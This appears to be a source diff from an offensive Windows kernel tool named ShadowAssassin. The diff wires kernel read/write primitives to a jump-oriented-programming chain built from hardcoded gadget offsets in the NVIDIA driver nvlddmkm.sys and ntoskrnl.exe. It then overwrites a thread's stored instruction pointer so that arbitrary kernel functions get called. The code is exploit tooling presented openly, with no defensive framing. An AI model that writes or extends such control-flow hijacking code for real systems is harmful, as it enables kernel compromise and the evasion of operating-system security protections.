@@ -71,6 +71,8 @@ bool ShadowAssassin::Initialize() {
     frameManager.SetReadPrimitive(readFn);
     frameManager.SetWritePrimitive(writeFn);
 
+	jopManager.SetWritePrimitive(writeFn);
+
     UINT64 currentEPROCESS = GetCurrentEPROCESS(EPROCESS);
 
 	if (!currentEPROCESS) {
@@ -82,6 +84,17 @@ bool ShadowAssassin::Initialize() {
 
 	frameManager.SetEPROCESS(currentEPROCESS);
 
+    nvidia_base = GetModuleBaseAddress("nvlddmkm.sys");
+    ntso_base = GetModuleBaseAddress("ntoskrnl.exe");
+
+    DbgLog("[CallSyscall] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);
+
+    if (nvidia_base == 0) {
+        DbgLog("[CallSyscall] Nvidia Driver not loaded! Load it! Press enter to continue anyways or cntrl c to stop.\n ");
+        getchar();
+    }
+
+	jopManager.SetNvidiaBase(nvidia_base);
 
     DbgLog("[ShadowAssassin::Initialize] OK: primitives wired\n");
     return true;
@@ -156,29 +169,15 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
     }
     DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);
 
-    UINT64 nvidia_base = GetModuleBaseAddress("nvlddmkm.sys");
-    UINT64 ntso_base = GetModuleBaseAddress("ntoskrnl.exe");
-    printf("[CallSyscall] nvidia base: %llx. ntso base: %llx\n", nvidia_base, ntso_base);
-
-    if (nvidia_base == 0) {
-        printf("[CallSyscall] Nvidia Driver not loaded! Load it! Press enter to continue anyways or cntrl c to stop.\n ");
-        getchar();
-    }
 
 
-    UINT64 old_rsp = frameManager.ReadRegister("rsp"); // testing to shift the stack
+    jopManager.Build(0x0078CB9E, 0x006d066a, 0x00671319, 0x0061cbb5);
+    jopManager.SetCallTarget(funcAddr);
+    jopManager.SetRestoreRip(frameManager.ReadStoredRegister("rip"));
 
-    printf("[Callsys] Old RSP: %llx", old_rsp);
-
-    //frameManager.WriteRegister("rsp", old_rsp + 0x58); //shifting stack forward so we can skip function
-
-    //frameManager.WriteRegister("rip", nvidia_base + 0x60ea0d); // return gadget
+    jopManager.Commit();
 
 
-
-
-    UINT64 starting_rip = frameManager.ReadRegister("rip");
-    printf("[CallSyscall] Current RIP before starting thread: %llx\n", starting_rip);
 
     Sleep(100);
 	__debugbreak();
